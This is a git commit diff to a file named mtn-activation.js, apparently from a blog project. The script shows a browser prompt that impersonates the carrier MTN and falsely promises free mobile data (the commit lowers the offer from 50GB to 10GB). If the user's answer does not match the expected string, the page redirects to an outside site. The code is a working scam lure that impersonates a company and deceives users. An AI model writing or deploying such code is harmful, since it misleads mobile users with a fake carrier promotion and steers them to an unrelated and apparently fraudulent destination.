2603af8649e96f55a710a65ed4970a3ad08e7026
dhatablog <williamsnsiako@gmail.com>
2025-10-08 06:51:24 +0100

    Update mtn-activation.js

--- mtn-activation.js
+++ mtn-activation.js
@@ -1,5 +1,5 @@
-var password = 'Activate 50GB'
-password=prompt('MTN: Congratulations, your mtn number is eligible to receive 50gb, click OK to activate now','Activate 50GB');
-if (password != 'Activate 50GB') {
+var password = 'ACTIVATE 10GB'
+password=prompt('MTN: Congratulations, your mtn number is eligible to receive 10gb, click OK to activate now','ACTIVATE 10GB');
+if (password != 'ACTIVATE 10GB') {
 location.href='https://eahigh.org/ng65yrs.html';
 }
